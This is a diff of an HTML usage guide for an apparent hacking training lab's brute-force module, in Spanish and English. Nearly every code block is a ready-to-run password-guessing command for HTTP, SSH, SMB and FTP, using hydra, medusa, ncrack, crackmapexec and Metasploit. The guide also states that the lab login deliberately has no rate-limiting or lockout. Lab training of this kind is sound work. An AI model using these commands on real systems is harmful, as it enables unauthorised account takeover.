@@ -125,7 +125,7 @@
     <h3>Guía de uso</h3>
     <ol>
       <li>El endpoint <code>/bruteforce/login</code> no implementa rate-limiting ni bloqueo de cuenta.</li>
-      <li><strong>Hydra HTTP:</strong> Ajusta el mensaje de error (<code>Credenciales incorrectas</code>) al texto real de respuesta fallida.</li>
+      <li><strong>Hydra HTTP:</strong> Usa <code>S=Login correcto</code> como indicador de éxito (el texto de error aparece en el HTML estático de la página).</li>
       <li><strong>Burp Intruder:</strong> Usa Cluster Bomb para atacar usuario + contraseña simultáneamente.</li>
       <li><strong>Wordlists recomendadas:</strong> <code>/usr/share/wordlists/rockyou.txt</code>, <code>/usr/share/seclists/Passwords/</code>, <code>/usr/share/seclists/Usernames/</code></li>
       <li>Para SSH/SMB, reemplaza <code>TARGET_IP</code> por la IP de la máquina objetivo.</li>
@@ -133,62 +133,68 @@
     <h3>Herramientas</h3>
     <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
     <h4>HTTP Login — Hydra</h4>
-    <pre><code class="language-bash"># Con deploy.sh / Docker (puerto 80) — acaba en segundos:
+    <pre><code class="language-bash"># Con deploy.sh / Docker (puerto 80):
 hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
   TARGET_IP http-post-form \
-  "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64
+  "/bruteforce/login:username=^USER^&password=^PASS^:S=Login correcto" -t 64
 
 # En local sin Docker (puerto 5000):
 hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
   TARGET_IP -s 5000 http-post-form \
-  "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64</code></pre>
+  "/bruteforce/login:username=^USER^&password=^PASS^:S=Login correcto" -t 64</code></pre>
     <h4>HTTP Login — Burp Suite Intruder</h4>
     <pre><code class="language-bash"># POST /bruteforce/login → Intruder → Sniper → mark §password§
 # Payloads: Simple list → fasttrack.txt → Launch → ordenar por longitud</code></pre>
     <h4>SSH — Hydra / Medusa / ncrack</h4>
-    <pre><code class="language-bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
-medusa -h TARGET_IP -u root -P rockyou.txt -M ssh
-ncrack -p 22 --user root -P rockyou.txt TARGET_IP</code></pre>
+    <pre><code class="language-bash"># Usuarios del lab: admin, alice, bob, charlie, dave
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt ssh://TARGET_IP -t 4
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/fasttrack.txt ssh://TARGET_IP -t 4
+medusa -h TARGET_IP -u admin -P /usr/share/wordlists/fasttrack.txt -M ssh
+ncrack -p 22 --user admin -P /usr/share/wordlists/fasttrack.txt TARGET_IP</code></pre>
     <h4>SSH — Metasploit</h4>
     <pre><code class="language-bash">use auxiliary/scanner/ssh/ssh_login
 set RHOSTS TARGET_IP
-set PASS_FILE /usr/share/wordlists/rockyou.txt
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
 run</code></pre>
     <h4>SMB — Hydra / CrackMapExec</h4>
-    <pre><code class="language-bash">hydra -l Administrator -P rockyou.txt smb://TARGET_IP
-crackmapexec smb TARGET_IP -u Administrator -p rockyou.txt</code></pre>
+    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/fasttrack.txt smb://TARGET_IP
+crackmapexec smb TARGET_IP -u admin -p /usr/share/wordlists/fasttrack.txt</code></pre>
     <h4>SMB — Metasploit</h4>
     <pre><code class="language-bash">use auxiliary/scanner/smb/smb_login
 set RHOSTS TARGET_IP
-set SMBUser Administrator
-set PASS_FILE /usr/share/wordlists/rockyou.txt
+set SMBUser admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
 run</code></pre>
     <h4>FTP — Hydra (puerto 21, protocolo real)</h4>
-    <pre><code class="language-bash"># Cluster Bomb: descubrir usuario + contraseña
+    <pre><code class="language-bash"># Usuario desconocido — Cluster Bomb:
 hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
-      -P /usr/share/wordlists/rockyou.txt \
-      ftp://TARGET_IP
+      -P /usr/share/wordlists/fasttrack.txt \
+      ftp://TARGET_IP -t 16
 
 # Si conoces el usuario:
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt ftp://TARGET_IP -t 16
 
 # Medusa
-medusa -h TARGET_IP -U users.txt -P rockyou.txt -M ftp
+medusa -h TARGET_IP -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+       -P /usr/share/wordlists/fasttrack.txt -M ftp
 
 # ncrack
-ncrack -p 21 -U users.txt -P rockyou.txt TARGET_IP</code></pre>
+ncrack -p 21 -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+       -P /usr/share/wordlists/fasttrack.txt TARGET_IP</code></pre>
     <h4>FTP — Metasploit</h4>
     <pre><code class="language-bash">use auxiliary/scanner/ftp/ftp_login
 set RHOSTS TARGET_IP
 set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
-set PASS_FILE /usr/share/wordlists/rockyou.txt
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
 run</code></pre>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Usage Guide</h3>
     <ol>
       <li>HackLabs' <code>/bruteforce/login</code> endpoint has no rate-limiting or account lockout.</li>
-      <li><strong>Hydra HTTP:</strong> Match the failure string (<code>Credenciales incorrectas</code>) to the actual failed response text.</li>
+      <li><strong>Hydra HTTP:</strong> Use <code>S=Login correcto</code> as the success indicator (the failure text appears in the page's static HTML).</li>
       <li><strong>Burp Intruder:</strong> Use Cluster Bomb to attack username + password simultaneously.</li>
       <li><strong>Recommended wordlists:</strong> <code>/usr/share/wordlists/rockyou.txt</code>, <code>/usr/share/seclists/Passwords/</code>, <code>/usr/share/seclists/Usernames/</code></li>
       <li>For SSH/SMB, replace <code>TARGET_IP</code> with the target machine IP.</li>
@@ -196,55 +202,61 @@ run</code></pre>
     <h3>Tools</h3>
     <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
     <h4>HTTP Login — Hydra</h4>
-    <pre><code class="language-bash"># With deploy.sh / Docker (port 80) — finishes in seconds:
+    <pre><code class="language-bash"># Con deploy.sh / Docker (puerto 80):
 hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
   TARGET_IP http-post-form \
-  "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64
+  "/bruteforce/login:username=^USER^&password=^PASS^:S=Login correcto" -t 64
 
-# Local without Docker (port 5000):
+# En local sin Docker (puerto 5000):
 hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
   TARGET_IP -s 5000 http-post-form \
-  "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64</code></pre>
+  "/bruteforce/login:username=^USER^&password=^PASS^:S=Login correcto" -t 64</code></pre>
     <h4>HTTP Login — Burp Suite Intruder</h4>
     <pre><code class="language-bash"># POST /bruteforce/login → Intruder → Sniper → mark §password§
 # Payloads: Simple list → fasttrack.txt → Launch → sort by length</code></pre>
     <h4>SSH — Hydra / Medusa / ncrack</h4>
-    <pre><code class="language-bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
-medusa -h TARGET_IP -u root -P rockyou.txt -M ssh
-ncrack -p 22 --user root -P rockyou.txt TARGET_IP</code></pre>
+    <pre><code class="language-bash"># Usuarios del lab: admin, alice, bob, charlie, dave
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt ssh://TARGET_IP -t 4
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/fasttrack.txt ssh://TARGET_IP -t 4
+medusa -h TARGET_IP -u admin -P /usr/share/wordlists/fasttrack.txt -M ssh
+ncrack -p 22 --user admin -P /usr/share/wordlists/fasttrack.txt TARGET_IP</code></pre>
     <h4>SSH — Metasploit</h4>
     <pre><code class="language-bash">use auxiliary/scanner/ssh/ssh_login
 set RHOSTS TARGET_IP
-set PASS_FILE /usr/share/wordlists/rockyou.txt
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
 run</code></pre>
     <h4>SMB — Hydra / CrackMapExec</h4>
-    <pre><code class="language-bash">hydra -l Administrator -P rockyou.txt smb://TARGET_IP
-crackmapexec smb TARGET_IP -u Administrator -p rockyou.txt</code></pre>
+    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/fasttrack.txt smb://TARGET_IP
+crackmapexec smb TARGET_IP -u admin -p /usr/share/wordlists/fasttrack.txt</code></pre>
     <h4>SMB — Metasploit</h4>
     <pre><code class="language-bash">use auxiliary/scanner/smb/smb_login
 set RHOSTS TARGET_IP
-set SMBUser Administrator
-set PASS_FILE /usr/share/wordlists/rockyou.txt
+set SMBUser admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
 run</code></pre>
     <h4>FTP — Hydra (port 21, real protocol)</h4>
-    <pre><code class="language-bash"># Cluster Bomb: discover username + password
+    <pre><code class="language-bash"># Usuario desconocido — Cluster Bomb:
 hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
-      -P /usr/share/wordlists/rockyou.txt \
-      ftp://TARGET_IP
+      -P /usr/share/wordlists/fasttrack.txt \
+      ftp://TARGET_IP -t 16
 
-# If username is known:
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
+# Si conoces el usuario:
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt ftp://TARGET_IP -t 16
 
 # Medusa
-medusa -h TARGET_IP -U users.txt -P rockyou.txt -M ftp
+medusa -h TARGET_IP -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+       -P /usr/share/wordlists/fasttrack.txt -M ftp
 
 # ncrack
-ncrack -p 21 -U users.txt -P rockyou.txt TARGET_IP</code></pre>
+ncrack -p 21 -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+       -P /usr/share/wordlists/fasttrack.txt TARGET_IP</code></pre>
     <h4>FTP — Metasploit</h4>
     <pre><code class="language-bash">use auxiliary/scanner/ftp/ftp_login
 set RHOSTS TARGET_IP
 set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
-set PASS_FILE /usr/share/wordlists/rockyou.txt
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
 run</code></pre>
   </div>
 </div>
